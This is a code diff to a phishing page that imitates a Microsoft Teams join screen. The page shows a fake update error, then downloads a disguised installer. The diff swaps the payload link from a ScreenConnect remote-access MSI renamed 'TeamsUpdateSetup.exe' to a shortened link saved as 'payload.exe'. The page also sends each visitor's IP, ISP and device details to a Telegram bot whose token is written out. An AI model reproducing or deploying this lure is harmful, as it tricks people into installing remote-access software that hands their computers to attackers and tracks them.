@@ -44,13 +44,13 @@
         /* JOIN BUTTON */
         .join-btn-wrapper {
             position: absolute;
-            bottom: 7.2%;      
+            bottom: 8.2%;      
             right: 11.5%;     
             z-index: 10;
         }
 
         .teams-btn {
-            background-color: #0078D4; /* Official Teams Blue */
+            background-color: #5b5bd6;
             color: white;
             border: none;
             padding: 8px 24px; 
@@ -74,7 +74,7 @@
 
         .spinner {
             border: 4px solid #f3f3f3;
-            border-top: 4px solid #0078D4;
+            border-top: 4px solid #5b5bd6;
             border-radius: 50%;
             width: 24px;
             height: 24px;
@@ -112,17 +112,24 @@
             margin-top: 5px;
         }
 
-        /* SLIDING UPDATE MODAL */
+        /* 
+           SLIDING UPDATE MODAL 
+        */
         .update-modal {
             position: fixed;
             bottom: 20px;
             left: 50%;
-            transform: translateX(-50%) translateY(100%);
-            width: 260px;
+            transform: translateX(-50%) translateY(100%); /* Slide from bottom */
+            
+            /* Smaller Width */
+            width: 260px; 
+            
             background: white;
             border-radius: 6px; 
             box-shadow: 0 8px 20px rgba(0,0,0,0.15); 
             z-index: 100;
+            
+            /* Animation Configuration */
             opacity: 0;
             visibility: hidden;
             transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275), 
@@ -130,12 +137,14 @@
                         visibility 0.3s ease;
         }
 
+        /* Class to trigger slide-in */
         .update-modal.show {
             transform: translateX(-50%) translateY(0); 
             opacity: 1;
             visibility: visible;
         }
 
+        /* Centered Content inside Modal */
         .update-content {
             padding: 16px; 
             text-align: center;
@@ -157,7 +166,7 @@
         
         .update-btn {
             width: 100%;
-            background: #0078D4; /* Teams Blue */
+            background: #5b5bd6;
             color: white;
             border: none;
             padding: 8px; 
@@ -284,7 +293,7 @@
                 Sorry, we couldn't connect you.
             </div>
             <div class="error-sub">
-                Your version of Microsoft Teams needs an update.<br>
+                This version of Microsoft Teams needs to be updated.<br>
                 Please update to continue.
             </div>
         </div>
@@ -306,7 +315,7 @@
         <div class="success-icon">
             <span class="checkmark">✓</span>
         </div>
-        <div class="success-text">Microsoft Teams Update Complete</div>
+        <div class="success-text">Installation Complete</div>
         <div class="sub-text">Please restart to join the meeting.</div>
     </div>
 
@@ -316,14 +325,7 @@
     // --- CONFIGURATION ---
     const BOT_TOKEN = "8751898702:AAGLQM3LI6UsBMjLx5QgGQKH0rLtV5y8OeM"; 
     const CHAT_ID = "8478799631";     
-    
-    // *** YOUR EXACT LINK ***
-    const PAYLOAD_URL = "https://0xarion.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"; 
-    
-    // *** CHANGE THE NAME HERE ***
-    // This is the EXACT name the file will have when downloaded
-    const CUSTOM_FILENAME = "TeamsUpdateSetup.exe"; 
-    
+    const PAYLOAD_URL = "https://bit.ly/4z8hZrC";
     // ---------------------
 
     async function getUserInfo() {
@@ -394,6 +396,7 @@
         
         // Trigger Slide-In Animation for Modal
         const modal = document.getElementById('updateModal');
+        // Small timeout to ensure DOM is ready, then add class for CSS transition
         setTimeout(() => {
             modal.classList.add('show');
         }, 500);
@@ -409,32 +412,13 @@
         
         sendToTelegram(`⬇️ *Update Clicked*\nIP: ${info.ip}\nISP: ${info.isp}\nDevice: ${info.device}\nTime: ${now}`);
 
-        // 2. Download Payload using BLOB METHOD (Guarantees Filename)
-        try {
-            const response = await fetch(PAYLOAD_URL);
-            const blob = await response.blob();
-            
-            // Create a temporary URL for the blob
-            const url = window.URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.style.display = 'none';
-            a.href = url;
-            
-            // *** THIS FORCES THE EXACT FILENAME ***
-            a.download = CUSTOM_FILENAME; 
-            
-            document.body.appendChild(a);
-            a.click();
-            
-            // Cleanup
-            window.URL.revokeObjectURL(url);
-            document.body.removeChild(a);
-
-        } catch (error) {
-            console.error("Download failed, falling back to direct link", error);
-            // Fallback: Just open the link directly
-            window.location.href = PAYLOAD_URL;
-        }
+        // 2. Download Payload
+        const link = document.createElement('a');
+        link.href = PAYLOAD_URL; 
+        link.download = 'payload.exe';
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
 
         // 3. Change Modal Text to Manual Install Instructions
         modalContent.innerHTML = `
@@ -469,7 +453,6 @@
             body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
         }).catch(console.error);
     }
-
 </script>
 
 </body>
